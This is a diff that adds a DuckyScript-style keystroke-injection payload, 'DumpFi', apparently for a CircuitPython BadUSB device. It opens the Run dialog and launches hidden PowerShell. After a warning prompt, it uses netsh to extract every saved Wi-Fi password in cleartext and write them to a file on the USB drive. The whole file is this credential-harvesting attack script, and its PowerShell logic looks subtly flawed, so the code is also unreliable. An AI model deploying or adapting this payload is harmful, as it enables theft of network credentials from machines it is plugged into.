@@ -1,0 +1,8 @@
+#T> DumpFi
+#D> Dump wifi passwords into the D:\ drive
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -windowstyle hidden -command "[void][Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); if([System.Windows.Forms.MessageBox]::Show('Warning: This will dump all saved Wi-Fi passwords onto the CIRCUITPY drive (D:). Continue?', 'Warning', 'OKCancel', 'Warning') -eq 'OK') { netsh wlan show profiles | ForEach-Object { $profile = $_ -match ':(.+)$' | Out-Null; if ($profile) { $name = $matches[1].Trim(); $pw = netsh wlan show profile name='$name' key=clear | Select-String 'Key Content' | ForEach-Object { $_.ToString().Split(':')[1].Trim() }; Add-Content -Path 'D:\\wifi_passwords.txt' -Value \"$name : $pw\" } } }"
+ENTER
